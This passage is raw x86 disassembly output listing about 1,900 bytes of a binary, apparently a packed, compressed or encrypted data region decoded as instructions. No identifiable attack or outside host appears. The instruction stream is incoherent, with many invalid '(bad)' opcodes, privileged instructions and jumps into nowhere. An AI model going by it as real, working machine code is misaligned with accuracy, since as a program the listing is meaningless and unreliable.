  410cff:	inc    edx
  410d00:	xchg   ebp,eax
  410d01:	push   esp
  410d02:	pop    ds
  410d03:	jb     0x410c9e
  410d05:	out    0x36,eax
  410d07:	or     al,0x7d
  410d09:	outs   dx,DWORD PTR ds:[esi]
  410d0a:	(bad)  
  410d0c:	add    dl,BYTE PTR [edi]
  410d0e:	push   ecx
  410d0f:	push   esp
  410d10:	inc    esp
  410d11:	pop    ebp
  410d12:	add    eax,0xcf6f4043
  410d17:	data16 (bad) 
  410d19:	sub    al,0xe8
  410d1b:	or     dh,BYTE PTR [eax+0x61c223d0]
  410d21:	pusha  
  410d22:	dec    eax
  410d23:	mov    eax,0xf93acee6
  410d28:	mov    cl,0x22
  410d2a:	pop    esi
  410d2b:	(bad)  
  410d2c:	sbb    bh,ah
  410d2e:	push   es
  410d2f:	or     DWORD PTR [edx],ecx
  410d31:	dec    DWORD PTR [ebp-0x3cb47557]
  410d37:	inc    esp
  410d38:	ret    
  410d39:	push   ecx
  410d3a:	cmp    dl,bl
  410d3c:	lds    esi,FWORD PTR ds:0x6da59fd9
  410d42:	jns    0x410da9
  410d44:	jge    0x410d54
  410d46:	inc    edi
  410d47:	adc    ebx,eax
  410d49:	jle    0x410d01
  410d4b:	in     al,0x26
  410d4d:	sub    BYTE PTR [ebx],al
  410d4f:	cmp    esi,ebp
  410d51:	inc    edi
  410d52:	sbb    eax,0xdb044612
  410d57:	jb     0x410d45
  410d59:	fst    DWORD PTR [esi+ebx*2-0x70]
  410d5d:	stos   BYTE PTR es:[edi],al
  410d5e:	sti    
  410d5f:	fwait
  410d60:	or     eax,0xaa471d92
  410d65:	and    ecx,DWORD PTR [esi]
  410d67:	sbb    al,0x23
  410d69:	cmc    
  410d6a:	mov    ebp,0xa66591dd
  410d6f:	popa   
  410d70:	add    esi,esp
  410d72:	scas   al,BYTE PTR es:[edi]
  410d73:	sti    
  410d74:	mov    BYTE PTR [edx+0x18],ah
  410d77:	adc    eax,0xceaf987c
  410d7c:	ror    BYTE PTR [ecx],0xf7
  410d7f:	jl     0x410d7d
  410d81:	lahf   
  410d82:	inc    esi
  410d83:	mov    esi,0x81163bb
  410d88:	frstor [esi+ebp*1-0x59ac37dc]
  410d8f:	push   edi
  410d90:	lahf   
  410d91:	jne    0x410d79
  410d93:	mov    WORD PTR [ecx+0x3a899f78],fs
  410d99:	add    dl,BYTE PTR [edx-0x43ab3cb4]
  410d9f:	add    al,0x66
  410da1:	adc    ebp,DWORD PTR [edx-0x2f]
  410da4:	jecxz  0x410dc8
  410da6:	mov    eax,ds:0x8d66ab8
  410dab:	add    esp,edi
  410dad:	and    al,0x9d
  410daf:	cdq    
  410db0:	stc    
  410db1:	xchg   BYTE PTR [edx-0x1e512c84],bl
  410db7:	xchg   BYTE PTR [edx-0x14cdce8f],dl
  410dbd:	sub    al,cl
  410dbf:	out    0x73,al
  410dc1:	xchg   edx,eax
  410dc2:	mov    ecx,0x7370cde0
  410dc7:	imul   eax,DWORD PTR [ecx+0x29ae4524],0x52
  410dce:	or     ah,ah
  410dd0:	pusha  
  410dd1:	push   ecx
  410dd2:	bound  ecx,QWORD PTR [edi]
  410dd4:	and    BYTE PTR ds:0xc87c746c,al
  410dda:	mov    fs,WORD PTR [ebp+0x17]
  410ddd:	(bad)  [edx+0x3de53f7b]
  410de3:	adc    dl,bl
  410de5:	dec    esp
  410de6:	scas   eax,DWORD PTR es:[edi]
  410de7:	repz xor al,0x7d
  410dea:	sub    esi,DWORD PTR [esp+ebx*2-0x48]
  410dee:	fst    DWORD PTR [edx]
  410df0:	test   eax,0x44531e62
  410df5:	mov    ebp,0xcd8d8019
  410dfa:	or     esp,DWORD PTR [edi+edi*8-0x15]
  410dfe:	(bad)  [edx+0x1c]
  410e01:	jae    0x410e15
  410e03:	push   cs
  410e04:	cmp    DWORD PTR [eax-0x61],eax
  410e07:	fwait
  410e08:	jne    0x410db0
  410e0a:	or     al,al
  410e0c:	aad    0x32
  410e0e:	mov    dh,0xea
  410e10:	jg     0x410dfa
  410e12:	sar    esp,0x49
  410e15:	inc    ecx
  410e16:	mov    edx,0x4d21a117
  410e1b:	hlt    
  410e1c:	jmp    0x595b6a6
  410e21:	pushf  
  410e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e23:	sub    eax,0x36c0a88d
  410e28:	pop    esp
  410e29:	or     BYTE PTR [edi+ecx*1],dh
  410e2c:	jae    0x410e9b
  410e2e:	sub    dl,ah
  410e30:	lea    edi,[ebx]
  410e32:	loopne 0x410e2e
  410e34:	mov    DWORD PTR [ebx],ebx
  410e36:	fs inc ebx
  410e38:	and    cl,ch
  410e3a:	(bad)  
  410e3b:	lahf   
  410e3c:	push   ds
  410e3d:	mov    cs,ebp
  410e3f:	dec    esp
  410e40:	jno    0x410e6e
  410e42:	xchg   ebp,eax
  410e43:	dec    esp
  410e44:	lods   eax,DWORD PTR ds:[esi]
  410e45:	mov    bl,0xa4
  410e47:	add    eax,0xa92cb463
  410e4c:	jnp    0x410ec1
  410e4e:	push   ebx
  410e4f:	mov    dl,0xa2
  410e51:	and    al,0x6a
  410e53:	adc    al,0x7e
  410e55:	clc    
  410e56:	push   edx
  410e57:	stos   DWORD PTR es:[edi],eax
  410e58:	aas    
  410e59:	cdq    
  410e5a:	aad    0xff
  410e5c:	and    ebp,ebx
  410e5e:	pushf  
  410e5f:	adc    eax,0x2b65a33
  410e64:	cmp    eax,0x597efa1b
  410e69:	inc    ebx
  410e6a:	adc    al,dh
  410e6c:	aas    
  410e6d:	inc    ecx
  410e6e:	xor    esp,esp
  410e70:	test   BYTE PTR [edx+0x7bc47d83],cl
  410e76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e77:	inc    edi
  410e78:	xchg   ebp,eax
  410e79:	(bad)  
  410e7a:	aam    0xac
  410e7c:	add    eax,0x84a49352
  410e81:	mov    ebp,DWORD PTR es:[eax+0x6e81fc00]
  410e88:	sub    BYTE PTR [edx+eax*4+0x217dbb8c],ch
  410e8f:	sbb    dh,BYTE PTR [edx+ecx*2+0x6a7de589]
  410e96:	adc    eax,0x6a0fdde9
  410e9b:	in     eax,0xe6
  410e9d:	xchg   ecx,eax
  410e9e:	pop    edx
  410e9f:	mov    ds:0xcd610da4,eax
  410ea4:	fs mov al,0x9b
  410ea7:	adc    dl,ah
  410ea9:	pusha  
  410eaa:	scas   al,BYTE PTR es:[edi]
  410eab:	jmp    0x410eb1
  410ead:	stos   DWORD PTR es:[edi],eax
  410eae:	ja     0x410e94
  410eb0:	push   ds
  410eb1:	mov    BYTE PTR cs:[bp+si],bl
  410eb5:	daa    
  410eb6:	xchg   edx,eax
  410eb7:	pop    DWORD PTR [eax-0x5e]
  410eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ebb:	mov    cl,0x19
  410ebd:	xchg   edi,eax
  410ebe:	test   BYTE PTR [edx+0x78],0x60
  410ec2:	pushf  
  410ec3:	xchg   edi,eax
  410ec4:	and    BYTE PTR [edx-0x67ec8632],dl
  410eca:	jl     0x410ee4
  410ecc:	stos   BYTE PTR es:[edi],al
  410ecd:	loopne 0x410e91
  410ecf:	jo     0x410e69
  410ed1:	or     DWORD PTR [ebp+0x13],0x6
  410ed5:	sub    ebp,DWORD PTR [eax]
  410ed7:	push   edx
  410ed8:	or     eax,DWORD PTR [edi+0x7d]
  410edb:	pop    esp
  410edc:	rol    BYTE PTR [edi-0x40f5c51e],0x5d
  410ee3:	xchg   esi,eax
  410ee4:	(bad)  
  410ee5:	or     ch,BYTE PTR ds:0x95d491f
  410eeb:	xchg   DWORD PTR [ecx-0x1de61a1],ecx
  410ef1:	pop    ecx
  410ef2:	dec    ebx
  410ef3:	shr    DWORD PTR [ecx],0xa6
  410ef6:	add    edx,ebp
  410ef8:	push   esi
  410ef9:	ror    BYTE PTR [eax+0x1a711bdd],1
  410eff:	dec    ecx
  410f00:	xchg   ebp,eax
  410f01:	push   cs
  410f02:	lea    ebp,[ebp-0x33ad9d6d]
  410f08:	xor    dl,BYTE PTR [eax]
  410f0a:	in     al,0xc6
  410f0c:	sti    
  410f0d:	push   ds
  410f0e:	push   esi
  410f0f:	push   0xcccb54fd
  410f14:	or     DWORD PTR [esi],0xffffffb2
  410f17:	ins    BYTE PTR es:[edi],dx
  410f18:	and    bl,al
  410f1a:	jg     0x410f5f
  410f1c:	sbb    DWORD PTR [ebp-0x66c06966],esp
  410f22:	xor    esi,0xffffffdd
  410f25:	loop   0x410f97
  410f27:	mov    edx,0xf249f021
  410f2c:	aam    0xe0
  410f2e:	jmp    0x410ee8
  410f30:	jecxz  0x410ec7
  410f32:	jp     0x410f25
  410f34:	mov    bh,BYTE PTR [ebx+0x15f015b7]
  410f3a:	aaa    
  410f3b:	mov    cl,0xdf
  410f3d:	wbinvd 
  410f3f:	fld    st(7)
  410f41:	mov    ch,0x7b
  410f43:	inc    edx
  410f44:	jp     0x410f42
  410f46:	leave  
  410f47:	or     edx,DWORD PTR [ecx]
  410f49:	xchg   ebx,eax
  410f4a:	call   0x1b961f2f
  410f4f:	push   es
  410f50:	in     eax,dx
  410f51:	fdiv   st(7),st
  410f53:	adc    eax,0xb9ff622c
  410f58:	mov    ah,0xd9
  410f5a:	dec    ebx
  410f5b:	jecxz  0x410f5e
  410f5d:	push   0x4d5bc750
  410f62:	pop    ecx
  410f63:	ret    
  410f64:	lahf   
  410f65:	mov    edx,0xb2c55f89
  410f6a:	xor    ch,BYTE PTR [edx+0x65aad57a]
  410f70:	inc    esi
  410f71:	mov    WORD PTR [edi-0x2d],?
  410f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f75:	neg    dh
  410f77:	stos   BYTE PTR es:[edi],al
  410f78:	lea    edx,[edx-0x32]
  410f7b:	aam    0xb7
  410f7d:	repnz mov esi,0xe1ec7d35
  410f83:	loop   0x410fbf
  410f85:	cmp    ebx,eax
  410f87:	dec    ecx
  410f88:	mov    ebp,0xeb921748
  410f8d:	into   
  410f8e:	pop    esp
  410f8f:	retf   0xdc87
  410f92:	int    0xf5
  410f94:	adc    BYTE PTR [ebx],bh
  410f96:	jmp    0xef444fb8
  410f9b:	mov    WORD PTR [ebx-0x50],ds
  410f9e:	mov    DWORD PTR [edi-0x22da54a0],0x85bfd657
  410fa8:	fidiv  DWORD PTR fs:[ebx-0x28cf5240]
  410faf:	je     0x410f69
  410fb1:	pop    edi
  410fb2:	or     BYTE PTR [edi-0x17],ch
  410fb5:	push   0xe24e56f1
  410fba:	test   BYTE PTR [esi+0x0],dl
  410fbd:	add    BYTE PTR [eax],al
  410fbf:	add    BYTE PTR [eax],al
  410fc1:	add    BYTE PTR ds:0xfe3de0ab,dl
  410fc7:	jg     0x410fa6
  410fc9:	stos   DWORD PTR es:[edi],eax
  410fca:	mov    esi,DWORD PTR [edi+0x2cdcd01b]
  410fd0:	pop    es
  410fd1:	out    dx,al
  410fd2:	outs   dx,DWORD PTR ds:[esi]
  410fd3:	adc    eax,DWORD PTR [ecx]
  410fd5:	add    BYTE PTR [edx],ah
  410fd7:	pop    es
  410fd8:	add    BYTE PTR [eax],al
  410fda:	push   ss
  410fdb:	xchg   BYTE PTR [ebx-0x11],bl
  410fde:	xor    eax,esp
  410fe0:	push   eax
  410fe1:	iret   
  410fe2:	dec    ebx
  410fe3:	sbb    DWORD PTR [eax+0x77b2b10d],ebp
  410fe9:	(bad)  [ebp+0x5bfcf30b]
  410fef:	and    dl,bh
  410ff1:	test   al,dl
  410ff3:	xchg   edx,eax
  410ff4:	retf   0x10df
  410ff7:	addr16 repnz add al,0x25
  410ffb:	cmp    al,0x29
  410ffd:	or     ch,dl
  410fff:	mov    ebp,0x686ee1ce
  411004:	(bad)  
  411005:	and    eax,0x6401b370
  41100a:	int    0xbb
  41100c:	rcl    DWORD PTR [ecx-0x3db79919],0xcd
  411013:	lahf   
  411014:	sub    ecx,DWORD PTR [edi-0x63]
  411017:	clc    
  411018:	fs inc eax
  41101a:	add    al,0xfa
  41101c:	xchg   ebx,eax
  41101d:	cli    
  41101e:	sub    eax,0x8839935f
  411023:	inc    edi
  411024:	mov    edx,0x305c7f54
  411029:	cli    
  41102a:	mov    DWORD PTR [edx-0x74],0x512210d2
  411031:	inc    ecx
  411032:	dec    edx
  411033:	and    al,0x2a
  411035:	xchg   edx,eax
  411036:	push   ebx
  411037:	lds    ebx,FWORD PTR [ebp+0x69]
  41103a:	push   esp
  41103b:	pop    ss
  41103c:	jg     0x411091
  41103e:	hlt    
  41103f:	aam    0x1c
  411041:	and    DWORD PTR es:[eax-0x4aa1b63c],esp
  411048:	pop    DWORD PTR [eax]
  41104a:	aas    
  41104b:	ins    DWORD PTR es:[edi],dx
  41104c:	sbb    bl,BYTE PTR [edx+0x35]
  41104f:	retf   
  411050:	push   0x76
  411052:	fnstcw WORD PTR [edx]
  411054:	mov    bl,BYTE PTR [edx]
  411056:	test   al,0x58
  411058:	dec    eax
  411059:	mov    ch,0x5e
  41105b:	push   ss
  41105c:	inc    esi
  41105d:	mov    dl,0xd0
  41105f:	jmp    0x9db7:0xe47eb30c
  411066:	cmp    eax,0x1fff2da
  41106b:	add    eax,0x27d0812f
  411070:	xchg   edx,eax
  411071:	pop    ds
  411072:	ret    
  411073:	aad    0xdc
  411075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411076:	(bad)  
  411077:	cmp    eax,DWORD PTR [esi+0x33317ddc]
  41107d:	cmp    eax,0xdee7a2dc
  411082:	popa   
  411083:	shr    BYTE PTR [ecx],1
  411085:	idiv   dl
  411087:	fimul  WORD PTR [eax]
  411089:	jl     0x41100f
  41108b:	outs   dx,DWORD PTR ds:[esi]
  41108c:	sbb    ebx,ebx
  41108e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41108f:	aas    
  411090:	jl     0x411023
  411092:	mov    ah,0x4f
  411094:	push   0x5cdc76a8
  411099:	not    ebp
  41109b:	mov    dh,0xc7
  41109d:	adc    eax,0xd8a44ba
  4110a2:	and    BYTE PTR [edx+0x54],0x86
  4110a6:	push   0xd
  4110a8:	hlt    
  4110a9:	cwde   
  4110aa:	out    0xc9,al
  4110ac:	mov    ch,0x4
  4110ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110af:	bound  ebx,QWORD PTR [eax-0x66]
  4110b2:	pop    ecx
  4110b3:	pop    ebx
  4110b4:	and    eax,0x688e2eaf
  4110b9:	xchg   ecx,eax
  4110ba:	pop    edi
  4110bb:	sbb    eax,0x10f1d82c
  4110c0:	fiadd  WORD PTR [ebp+ecx*4+0x1c4f00ec]
  4110c7:	xchg   esi,eax
  4110c8:	xchg   ebp,eax
  4110c9:	cmp    al,0x40
  4110cb:	(bad)
  4110cf:	dec    ebp
  4110d0:	add    eax,0x1382522d
  4110d5:	adc    ebx,DWORD PTR [esi+0x21aa024c]
  4110db:	out    0x62,eax
  4110dd:	daa    
  4110de:	rcr    DWORD PTR [edi],1
  4110e0:	mov    ebp,0x41715eff
  4110e5:	pop    ebp
  4110e6:	dec    edx
  4110e7:	jne    0x4110c8
  4110e9:	(bad)  
  4110ea:	xchg   edi,eax
  4110eb:	pop    edi
  4110ec:	or     dh,BYTE PTR [ebx-0x72acba2f]
  4110f2:	mov    ah,0xd
  4110f4:	cs ja  0x4110c1
  4110f7:	or     eax,0x2e23933d
  4110fc:	mov    DWORD PTR [ebx-0x54],ebp
  4110ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411100:	and    eax,0x165d8943
  411105:	adc    al,0xdf
  411107:	dec    ebp
  411108:	ficom  WORD PTR ds:0x44c3db82
  41110e:	xchg   ebp,eax
  41110f:	test   eax,0xff337b5d
  411114:	loope  0x4110e9
  411116:	pop    ebp
  411117:	jns    0x411163
  411119:	cmc    
  41111a:	mov    ds:0x414c4100,eax
  41111f:	out    0xcd,al
  411121:	inc    esp
  411122:	lds    esp,FWORD PTR [esi]
  411124:	mov    BYTE PTR [ebp+0x5b],dl
  411127:	xchg   ebp,eax
  411128:	shr    DWORD PTR [eax+edx*8+0x7],1
  41112c:	shl    DWORD PTR [esi-0x6454da29],0x8f
  411133:	jb     0x41116b
  411135:	push   es
  411136:	stc    
  411137:	sub    eax,0xffffff85
  41113a:	push   edi
  41113b:	and    BYTE PTR [ecx],dh
  41113d:	or     eax,DWORD PTR [edi+0x74d99728]
  411143:	out    dx,eax
  411144:	stos   BYTE PTR es:[edi],al
  411145:	call   0x6482:0x914569d4
  41114c:	inc    eax
  41114d:	mov    ebx,DWORD PTR [ebp+eiz*2+0x11b58f10]
  411154:	sub    esi,DWORD PTR [edi-0x1e]
  411157:	icebp  
  411158:	xchg   edx,eax
  411159:	cmp    al,0xd2
  41115b:	mov    WORD PTR [ebp-0x64692cfd],cs
  411161:	int    0xcc
  411163:	aas    
  411164:	sub    BYTE PTR [edx],0xef
  411167:	ret    
  411168:	test   DWORD PTR ds:0xee086a4a,edx
  41116e:	push   es
  41116f:	jno    0x411165
  411171:	shl    ecx,cl
  411173:	jns    0x41118a
  411175:	jnp    0x4111ec
  411177:	outs   dx,BYTE PTR ds:[esi]
  411178:	out    0x86,eax
  41117a:	mov    ch,BYTE PTR [edi]
  41117c:	das    
  41117d:	or     ebp,edi
  41117f:	xchg   esp,eax
  411180:	pusha  
  411181:	lahf   
  411182:	mov    edi,0xc6df39a9
  411187:	dec    edx
  411188:	fwait
  411189:	cmp    edx,DWORD PTR [esi+0x2c4b5bef]
  41118f:	push   edx
  411190:	push   edi
  411191:	aaa    
  411192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411193:	fs not al
  411196:	push   ss
  411197:	push   edx
  411198:	outs   dx,DWORD PTR ds:[esi]
  411199:	cwde   
  41119a:	fwait
  41119b:	inc    ebp
  41119c:	scas   eax,DWORD PTR es:[edi]
  41119d:	fwait
  41119e:	lock leave 
  4111a0:	(bad)  
  4111a1:	iret   
  4111a2:	mov    esp,0x2715f39f
  4111a7:	not    DWORD PTR [edx]
  4111a9:	add    al,0xeb
  4111ab:	sub    BYTE PTR ss:[edx+0x49e289da],dh
  4111b2:	rol    BYTE PTR [ebx],0x3b
  4111b5:	imul   ecx,DWORD PTR [ebp+0x32],0xf0f3e01f
  4111bc:	sbb    edi,DWORD PTR [esi-0x57243432]
  4111c2:	jg     0x411152
  4111c4:	rcr    BYTE PTR ds:0x4cbc0fa7,1
  4111ca:	gs iret 
  4111cc:	aas    
  4111cd:	mov    bl,BYTE PTR [esi]
  4111cf:	lds    edx,FWORD PTR [esi-0x69]
  4111d2:	sub    ecx,eax
  4111d4:	cs leave 
  4111d6:	out    dx,eax
  4111d7:	push   ebx
  4111d8:	out    0x57,al
  4111da:	(bad)  
  4111db:	jnp    0x411240
  4111dd:	les    esp,FWORD PTR ds:0xe56a8bb3
  4111e3:	(bad)  
  4111e4:	adc    BYTE PTR [edi],dh
  4111e6:	jg     0x4111ff
  4111e8:	mov    ecx,esp
  4111ea:	and    al,0x41
  4111ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111ed:	je     0x4111a0
  4111ef:	fldenv [edi+0x609b9ef9]
  4111f5:	inc    esi
  4111f6:	xchg   esi,eax
  4111f7:	imul   esp,esi,0xffffff91
  4111fa:	loopne 0x4111c9
  4111fc:	cmp    al,0x84
  4111fe:	xchg   ebp,edx
  411200:	imul   ecx,DWORD PTR [ebp-0x4db19fd9],0xf6431dfd
  41120a:	pop    es
  41120b:	loop   0x411215
  41120d:	scas   eax,DWORD PTR es:[edi]
  41120e:	je     0x411208
  411210:	or     eax,0x2f5c1cd
  411215:	leave  
  411216:	push   es
  411217:	into   
  411218:	cdq    
  411219:	mov    al,0x4
  41121b:	sub    DWORD PTR [eax+0x21],esp
  41121e:	and    eax,DWORD PTR [ecx-0x72]
  411221:	shl    BYTE PTR [esi-0x45],0x9c
  411225:	in     eax,dx
  411226:	aam    0x15
  411228:	mov    ecx,0x87c7f3c7
  41122d:	stos   BYTE PTR es:[edi],al
  41122e:	xor    BYTE PTR [esi],dh
  411230:	mov    ebx,DWORD PTR [ebx+0x4347fe55]
  411236:	(bad)  
  411237:	jle    0x411208
  411239:	outs   dx,DWORD PTR ds:[esi]
  41123a:	js     0x41129f
  41123c:	outs   dx,BYTE PTR ds:[esi]
  41123d:	add    al,0x80
  41123f:	xor    DWORD PTR [edi+0x6e],edi
  411242:	ret    
  411243:	in     al,dx
  411244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411245:	add    eax,DWORD PTR [edi+ebx*2-0x19]
  411249:	pop    edi
  41124a:	jge    0x411270
  41124c:	sbb    al,0x2b
  41124e:	pop    esp
  41124f:	and    al,0xd7
  411251:	sbb    al,0xdd
  411253:	jl     0x411295
  411255:	pop    edi
  411256:	outs   dx,BYTE PTR ds:[esi]
  411257:	pop    edi
  411258:	push   ebp
  411259:	jge    0x41122e
  41125b:	dec    esi
  41125c:	call   0xc38b:0xaee5bcd2
  411263:	pop    eax
  411264:	and    DWORD PTR [edx-0x2cabeea4],0x86722bb7
  41126e:	pop    eax
  41126f:	fs cli 
  411271:	das    
  411272:	xchg   BYTE PTR [ecx-0x6a292af0],dl
  411278:	inc    edi
  411279:	or     al,BYTE PTR [esi+0x8]
  41127c:	retf   0x7f6a
  41127f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411280:	inc    eax
  411281:	mov    ebp,0xb41e6349
  411286:	push   eax
  411287:	sub    eax,0x1c7062d9
  41128c:	nop
  41128d:	cdq    
  41128e:	stos   BYTE PTR es:[edi],al
  41128f:	test   al,0xa3
  411291:	mov    DWORD PTR [eax+ebx*2-0x3f72865e],ecx
  411298:	mov    BYTE PTR [ebp+0x2c],al
  41129b:	mov    gs,WORD PTR [edx+0x15]
  41129e:	mul    eax
  4112a0:	int3   
  4112a1:	cmp    ah,BYTE PTR [ebx+0x5d466e84]
  4112a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112a8:	jmp    0x864f9dd4
  4112ad:	call   0x457d:0xc194f12a
  4112b4:	lahf   
  4112b5:	push   edx
  4112b6:	jl     0x411266
  4112b8:	sub    dl,ch
  4112ba:	mov    ds:0x861124d2,al
  4112bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112c0:	sbb    al,0x25
  4112c2:	cmp    eax,DWORD PTR ds:0x4cb58b08
  4112c8:	pusha  
  4112c9:	xor    al,BYTE PTR [ecx+0x2525d9f7]
  4112cf:	(bad)  
  4112d0:	mov    ebp,DWORD PTR [edx]
  4112d2:	mov    DWORD PTR [edi+0x3f],ecx
  4112d5:	cmp    ecx,ebp
  4112d7:	sbb    eax,DWORD PTR [edx-0x4c798748]
  4112dd:	mov    dh,0x8
  4112df:	imul   DWORD PTR [esi+ebx*2+0x598beb68]
  4112e6:	jp     0x4112c0
  4112e8:	mov    WORD PTR [ebx+0xb],?
  4112eb:	out    0x80,eax
  4112ed:	(bad)  
  4112ef:	stos   DWORD PTR es:[edi],eax
  4112f0:	aam    0x1f
  4112f2:	std    
  4112f3:	xchg   esi,eax
  4112f4:	je     0x4112de
  4112f6:	mov    bl,0xe3
  4112f8:	retf   
  4112f9:	inc    DWORD PTR [edi-0x7c6733dd]
  4112ff:	mov    bl,0x33
  411301:	dec    esi
  411302:	inc    ebx
  411303:	inc    eax
  411304:	mov    bl,0x17
  411306:	sbb    BYTE PTR [edx-0x39],al
  411309:	push   edx
  41130a:	inc    edi
  41130b:	cmp    BYTE PTR [ebp-0x7e],dl
  41130e:	icebp  
  41130f:	mov    bh,0xc1
  411311:	push   ds
  411312:	pusha  
  411313:	and    eax,DWORD PTR [ebx-0x51531cf1]
  411319:	adc    bh,BYTE PTR [ecx-0x1c177105]
  41131f:	and    eax,0x41abd374
  411324:	stos   BYTE PTR es:[edi],al
  411325:	in     al,0xaf
  411327:	mov    ah,0xb
  411329:	jg     0x41139c
  41132b:	ret    0x6c7
  41132e:	ins    BYTE PTR es:[edi],dx
  41132f:	rcr    ah,cl
  411331:	jecxz  0x411341
  411333:	mov    esi,0xe8921baf
  411338:	clc    
  411339:	cdq    
  41133a:	sub    bl,al
  41133c:	push   esi
  41133d:	fdiv   st,st(3)
  41133f:	sub    ebp,esp
  411341:	mov    gs,WORD PTR [edi-0x76]
  411344:	pop    eax
  411345:	retf   0xade1
  411348:	fldenv [ecx-0x29eb041f]
  41134e:	push   edi
  41134f:	inc    ebx
  411350:	inc    ebp
  411351:	stc    
  411352:	mov    dl,0xfc
  411354:	(bad)  
  411355:	pop    ss
  411356:	mov    ebp,0x14443838
  41135b:	out    0x70,eax
  41135d:	mov    eax,ds:0x643044a0
  411362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411363:	xor    ecx,DWORD PTR [ecx]
  411365:	cwde   
  411366:	shr    DWORD PTR [ecx+0x141ee643],0x3
  41136d:	xor    DWORD PTR [ebp-0x24],ebp
  411370:	ins    BYTE PTR es:[edi],dx
  411371:	push   cs
  411372:	daa    
  411373:	inc    ecx
  411374:	idiv   ecx
  411376:	pop    edx
  411377:	cmc    
  411378:	jl     0x41136b
  41137a:	clc    
  41137b:	hlt    
  41137c:	aaa    
  41137d:	xchg   ecx,eax
  41137e:	out    0xf1,al
  411380:	mov    dh,0xc
  411382:	adc    edi,DWORD PTR [eax-0x74]
  411385:	or     BYTE PTR cs:[edx],dl
  411388:	idiv   DWORD PTR [edi+0x54]
  41138b:	mov    bl,0xab
  41138d:	or     dl,bl
  41138f:	int    0x34
  411391:	(bad)  
  411392:	mov    esi,0x3cd96f01
  411397:	add    ecx,DWORD PTR [ecx-0x38e7ce3a]
  41139d:	cmp    esp,ecx
  41139f:	hlt    
  4113a0:	arpl   WORD PTR [edi-0x18],di
  4113a3:	mov    fs,WORD PTR [ecx]
  4113a5:	stos   BYTE PTR es:[edi],al
  4113a6:	lahf   
  4113a7:	(bad)  
  4113a8:	sub    ebp,DWORD PTR [ebp+0x64b6a592]
  4113ae:	and    al,BYTE PTR [edi]
  4113b0:	pop    es
  4113b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113b2:	pop    eax
  4113b3:	mov    edx,0x7b57a47d
  4113b8:	mov    al,ds:0x96a18d1e
  4113bd:	lahf   
  4113be:	jne    0x411405
  4113c0:	add    DWORD PTR [edi+0x1e3a75d0],esi
  4113c6:	push   ebp
  4113c7:	scas   al,BYTE PTR es:[edi]
  4113c8:	cmp    bl,bh
  4113ca:	mov    eax,ds:0x9e32b37f
  4113cf:	fldcw  WORD PTR [ebp-0x59]
  4113d2:	clc    
  4113d3:	mov    DWORD PTR [edx+0x510c97c2],0x9f294c76
  4113dd:	xchg   edi,ecx
  4113df:	fs ror ebx,0xee
  4113e3:	jne    0x411372
  4113e5:	adc    BYTE PTR [esi+0x1f],bh
  4113e8:	jns    0x4113ce
  4113ea:	inc    esi
  4113eb:	and    ah,BYTE PTR [esi-0x62e92d29]
  4113f1:	adc    DWORD PTR [edx+edx*4],0xf2e2cb40
  4113f8:	sahf   
  4113f9:	ins    BYTE PTR es:[edi],dx
  4113fa:	out    0xc,eax
  4113fc:	(bad)  
  4113fe:	test   DWORD PTR ss:[esi-0x7],0xa56774ae
  411406:	adc    BYTE PTR [edx+ebp*2-0x30],0xcc
  41140b:	cmp    ch,0xff
  41140e:	inc    BYTE PTR [ecx+0x21954489]
  411414:	stos   DWORD PTR es:[edi],eax
  411415:	fwait
  411416:	pushf  
  411417:	sbb    eax,0x169d4537
  41141c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41141d:	mul    BYTE PTR [ebx]
  41141f:	fcmovnu st,st(5)
  411421:	imul   ebx,DWORD PTR [edi-0x161f8d19],0x111a0142
  41142b:	scas   al,BYTE PTR es:[edi]
  41142c:	add    eax,0xdda3312f
  411431:	ret    
  411432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411433:	mov    cl,0xd9
  411435:	aam    0xa8
  411437:	xor    BYTE PTR [ecx-0x3680ea9a],bl
  41143d:	pop    ecx
  41143e:	lahf   
  41143f:	and    BYTE PTR [edx+0x70],ch
  411442:	into   
  411443:	adc    BYTE PTR [eax+0x1e109c05],ah
  411449:	ret    0x10d3
  41144c:	lods   eax,DWORD PTR ds:[esi]
  41144d:	or     eax,0x5ba94318
  411452:	inc    ebp
  411453:	jae    0x4113db
  411455:	pop    edi
  411456:	ror    BYTE PTR [ebx-0x7cbb8efa],0xa1
  41145d:	retf   
  41145e:	and    BYTE PTR [eax-0x293650ef],al
  411464:	iret   
  411465:	pop    ecx
  411466:	dec    ebp
  411467:	mov    ebp,esp
  411469:	or     bh,BYTE PTR [ebp+ebp*4+0x5e]
  41146d:	ret    0xbbf2
  411470:	lock retf 0x2780
  411474:	stos   DWORD PTR es:[edi],eax
  411475:	inc    edi
  411476:	dec    esp
  411477:	push   ecx
  411478:	push   edx
  411479:	mov    esp,edx
  41147b:	pop    esp
  41147c:	sub    BYTE PTR [esi],dh
  41147e:	add    al,0xd7
  411480:	int    0xdd
  411482:	add    dl,dh
  411484:	push   ebx
  411485:	mov    edx,0xadea5543
  41148a:	mov    al,ds:0xf5b1245d
  41148f:	jmp    0x7e75:0xa2a376ea
  411496:	and    eax,0x6c
  411499:	fnsave [ebx]
  41149b:	fcom   DWORD PTR [ecx]
  41149d:	sub    eax,0x5354d8d9
  4114a2:	pop    es
  4114a3:	cmp    eax,0xec94372a
  4114a8:	test   al,0x93
  4114aa:	lock inc eax
  4114ac:	push   esp
  4114ad:	clc    
  4114ae:	lods   al,BYTE PTR ds:[esi]
  4114af:	xchg   edx,eax
  4114b0:	push   edi
  4114b1:	retf   
  4114b2:	adc    al,0xda
